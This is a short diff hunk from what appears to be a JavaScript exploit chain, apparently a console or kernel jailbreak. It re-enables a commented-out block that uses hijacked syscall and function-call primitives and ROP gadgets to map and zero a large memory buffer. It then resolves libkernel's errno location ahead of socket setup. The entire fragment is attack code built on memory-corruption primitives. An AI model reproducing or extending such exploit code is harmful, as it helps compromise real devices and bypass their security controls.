@@ -325,13 +325,13 @@ var stage2_ = function () {
 		awaitpl();
 		return;
 	}
-	/*
+	
 	var userland_buffer = p.syscall(477, 0, 0x4A00000, 3, 0x1000, -1, 0);
 	alert("u buffer = 0x" + userland_buffer);
 	p.syscall(324, 1);
 	p.fcall(gadgets2.memset, userland_buffer, 0x00, 0x4A00000);
 	alert("memset");
-	*/
+	
 	const errno_location = p.fcall(libKernelBase.add32(libk__error_offset));
 
 	const AF_INET6 = 28;
